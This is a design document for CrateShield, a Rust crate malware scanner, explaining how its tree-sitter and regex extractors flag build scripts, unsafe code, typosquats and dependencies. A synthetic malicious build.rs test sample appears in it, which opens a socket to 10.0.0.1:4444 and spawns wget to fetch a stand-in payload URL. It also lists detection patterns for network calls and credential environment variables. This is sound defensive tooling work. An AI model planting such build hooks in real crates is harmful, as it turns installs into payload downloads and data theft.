# Tree-sitter Signal Extraction Pipeline

> **Scope:** This document explains exactly how CrateShield uses tree-sitter to
> extract its five signal families. Every claim is grounded in the actual
> extractor source files under `src/crateshield/signals/`.

---

## 1. Architecture Overview

Tree-sitter is used by exactly **two** of the five signal modules:
`build_rs.py` and `unsafe_ffi.py`. The remaining three (`proc_macro.py`,
`typosquat.py`, `dependencies.py`) use string/regex matching or TOML parsing.
This is a deliberate tradeoff explained per-module below.

A singleton Rust-grammar parser is initialised once in
`signals/extractor.py` and shared across all files in a scan:

```python
# extractor.py  lines 9-34
from tree_sitter import Language, Parser
import tree_sitter_rust as tsrust

def rust_parser() -> Parser:
    global _PARSER
    if _PARSER is None:
        _PARSER = Parser(Language(tsrust.language()))
    return _PARSER
```

The same `Parser` object is passed into `analyze_build_rs(files, parser)` and
`analyze_unsafe_ffi(files, parser)`.

---

## 2. Signal Family: `build_rs` — `signals/build_rs.py`

### 2a. Node types queried

`analyze_build_rs` calls `parser.parse(src)` on the raw bytes of `build.rs`
and walks **every node** with `_walk()`:

```python
# build_rs.py  lines 75-78
for node in _walk(tree.root_node):
    if node.type != "call_expression":
        continue
    name = _call_name(src, node)
```

Only `"call_expression"` nodes are processed. Within each match, two
field accesses are used:

- `node.child_by_field_name("function")` — the callee expression
- `node.child_by_field_name("arguments")` — the arg list (for `"string_literal"` children)

### 2b. Detector logic per signal bucket

| Signal | Callee strings matched |
|---|---|
| `network_calls` | `TcpStream::connect`, `UdpSocket::bind/connect`, `TcpListener::bind`; or name contains `reqwest`, `ureq`, `hyper`, `curl`, `attohttpc` |
| `process_spawns` | `Command::new`, `process::Command`, or name contains `"Command"` |
| `file_writes` | `fs::write`, `File::create`, `OpenOptions`, `BufWriter` |
| `env_reads` | `env::var`, `env::vars`, `env::var_os`, `env::vars_os` |

`sensitive_env_reads` is a subset of `env_reads`: keys not in `BENIGN_ENV_KEYS`
(`OUT_DIR`, `CARGO_*`, `TARGET`, etc.) that match `SENSITIVE_ENV_KEYS` prefixes
(`AWS_`, `GITHUB_TOKEN`, `SSH_`, `CARGO_REGISTRY_TOKEN`, etc.) from `config.py`.

### 2c. Why AST over regex for `build.rs`

The string `"TcpStream"` could appear in a comment, a doc string, or a printed
message. A regex match on raw text cannot distinguish these. Consider:

```rust
// TODO: consider using TcpStream::connect for health checks
println!("spawning worker threads");
let _s = TcpStream::connect("10.0.0.1:31337")?;  // actual call
```

A regex fires on all three. The tree-sitter AST labels each token: the first
two occurrences are inside `line_comment` and `string_literal` nodes; only
the third is a `call_expression` with a `function` field resolving to
`TcpStream::connect`. The extractor gates on `node.type == "call_expression"`,
so only the third fires.

### 2d. Worked example — `syn_buildrs_2`

**Source** (`data/synthetic_crates/syn_buildrs_2/build.rs`):
```rust
use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1:4444") { /* exfil */ }
    let _v = env::var("DATABASE_URL").unwrap_or_default();
    Command::new("wget").arg("http://metrics-relay.example/payload").spawn().ok();
}
```

**AST fragment** (node.type values at each matched call):
```
source_file
  function_item (name: main)
    block
      if_expression
        call_expression [type=call_expression] ← match
          function: scoped_call_expression → "TcpStream::connect"
          arguments: string_literal "10.0.0.1:4444"
      let_declaration
        call_expression [type=call_expression] ← match
          function: scoped_call_expression → "env::var"
          arguments: string_literal "DATABASE_URL"
      call_expression [type=call_expression] ← match chain
          function: field_expression → "Command::new"
          arguments: string_literal "wget"
```

**Resulting JSON** (`data/signals/syn_buildrs_2-0.1.0.json`):
```json
"build_rs": {
  "has_build_rs": true,
  "signals": ["env_var_read", "network_call", "process_spawn"],
  "network_calls": ["TcpStream::connect(10.0.0.1:4444)"],
  "env_reads": ["env::var(\"DATABASE_URL\").unwrap_or_default", "DATABASE_URL"],
  "sensitive_env_reads": [],
  "process_spawns": ["Command::new(\"wget\").arg(\"http://metrics-relay.example/payload\").spawn().ok"],
  "flagged_snippets": ["...±2-line context around each match..."]
}
```

`DATABASE_URL` does not appear in `SENSITIVE_ENV_KEYS`, so `sensitive_env_reads`
is empty — this is a known gap (see §2e below).

### 2e. Limitations

1. **Macro-expanded code is invisible.** Tree-sitter parses source on disk
   before macro expansion. A `TcpStream::connect` call inside a macro body is
   not visible in the pre-expansion AST.
2. **No cross-file taint tracking.** Helper functions defined in files other
   than `build.rs` are not analysed.
3. **`SENSITIVE_ENV_KEYS` is a static prefix list.** Novel sensitive variable
   names not on the list (e.g. `DATABASE_URL`, `CLOUDFLARE_API_KEY`) pass
   through silently.
4. **Snippet deduplication is absent.** Chained method calls (`.arg(...)` on
   `Command::new`) produce duplicate snippets in `flagged_snippets`.

---

## 3. Signal Family: `unsafe_ffi` — `signals/unsafe_ffi.py`

### 3a. Node types queried

`analyze_unsafe_ffi` calls `parser.parse(src)` on each `*.rs` source file and
walks all nodes, matching on four specific node types:

```python
# unsafe_ffi.py  lines 31-43
for node in _walk(tree.root_node):
    if node.type == "unsafe_block":
        unsafe_blocks += 1
    if node.type in {"function_item", "function_signature_item"}:
        if any(c.type == "unsafe" for c in node.children):
            unsafe_fns += 1
    if node.type == "extern_modifier" or node.type == "foreign_mod_item":
        ffi.append(_node_text(src, node)[:200])
    if node.type == "call_expression":
        name = _node_text(src, node.child_by_field_name("function") or node)
        if "syscall" in name or name.startswith("libc::"):
            syscalls.append(name)
```

| Node type | Tree-sitter meaning |
|---|---|
| `unsafe_block` | `unsafe { ... }` block |
| `function_item` | `fn foo() { ... }` — checked for `unsafe` child token |
| `function_signature_item` | Trait method signature — also checked for `unsafe` |
| `extern_modifier` | `extern "C"` keyword in a function signature |
| `foreign_mod_item` | `extern "C" { ... }` FFI declarations block |
| `call_expression` | Filtered for `libc::` prefix or `syscall` substring |

### 3b. Why AST over regex

The word `"unsafe"` appears in `// SAFETY: ...` comments throughout Rust code.
`unsafe_per_kloc` computed from raw text would massively overcount.
A function named `my_unsafe_helper()` would also match `\bunsafe\b` regex but
is NOT an `unsafe_block` node. The AST check is exact.

### 3c. Limitations

1. **Density only; no soundness check.** High `unsafe_per_kloc` could mean a
   crate wrapping a well-audited C library or one full of reckless raw-pointer
   access — the metric cannot distinguish them.
2. **FFI text is truncated to 200 chars** per node.
3. **`parse_error` is OR-accumulated** across files; one malformed file taints
   the whole crate's signal.

---

## 4. Signal Family: `proc_macro` — `signals/proc_macro.py`

### 4a. Method (NOT tree-sitter — regex + string search)

```python
# proc_macro.py  lines 10-19
is_pm = bool(re.search(r"proc-macro\s*=\s*true", toml))
if is_pm:
    blob = "\n".join(p.read_text(...) for p in source_files)
    for s in SUSPICIOUS_IMPORTS:
        if s in blob:
            suspicious.append(s)
```

`SUSPICIOUS_IMPORTS = ("std::process", "std::net", "std::os::raw", "reqwest", "ureq", "std::fs")`

### 4b. Why regex is acceptable here

`proc-macro = true` is a TOML key in a structured file — regex is correct and
simpler than invoking a Rust AST parser. The import detection is intentionally
low-fidelity: it flags any proc-macro that *mentions* a suspicious stdlib
module anywhere in source. False positives (a legitimate proc-macro that
documents `std::process` in a comment) are acceptable because the signal is
used only as a supporting tiebreaker, not a standalone verdict.

### 4c. Limitations

- String containment will match inside comments and string literals.
- No handling of alias imports (`use std::process as proc`).

---

## 5. Signal Family: `typosquatting` — `signals/typosquat.py`

### 5a. Method (Levenshtein distance — no tree-sitter)

```python
# typosquat.py  lines 26-62
dist = levenshtein(_norm(name), _norm(target))
score = 1 - (dist / max(len(n), len(t), 1))
# Flagged if score >= 0.85 AND dist <= 2
```

`_norm()` lowercases and converts `-` to `_`. A hyphen/underscore confusion
pattern raises score to at least 0.90. Threshold constants are in `config.py`:
`TYPOSQUAT_THRESHOLD = 0.85`, `TYPOSQUAT_MAX_DISTANCE = 2`.

### 5b. Why no tree-sitter

Typosquatting is a property of the **package name string**, not source code.
No parsing is needed. The comparison corpus (top-1000 crates) is fetched from
the crates.io API and cached 24 hours in `data/top_crates_cache.json`.

### 5c. Limitations

- Edit distance is necessary but not sufficient — `rand2` (distance 1 from
  `rand`) could be a legitimate major-version fork.
- Only top-1000 crates compared; typosquats of rank-1001+ crates are missed.

---

## 6. Signal Family: `dependencies` — `signals/dependencies.py`

### 6a. Method (TOML parsing — no tree-sitter)

```python
# dependencies.py  lines 8-28
data = tomllib.loads(toml_text)
deps = list((data.get("dependencies") or {}).keys())
pinned = any(isinstance(v, str) and v.startswith("=") for v in ...)
```

Python stdlib `tomllib` parses `Cargo.toml`. Exact-pinned versions use
Cargo's `="1.2.3"` syntax.

### 6b. Why no tree-sitter

`Cargo.toml` is TOML, not Rust. A TOML parser is the correct tool.

### 6c. Limitations

- `suspicious` list is always empty (placeholder field; no heuristics applied).
- `Cargo.lock` is loaded but never consumed by any extractor.
- Git-sourced or path-sourced dependencies bypass the registry and are not
  flagged despite being a known attack vector.
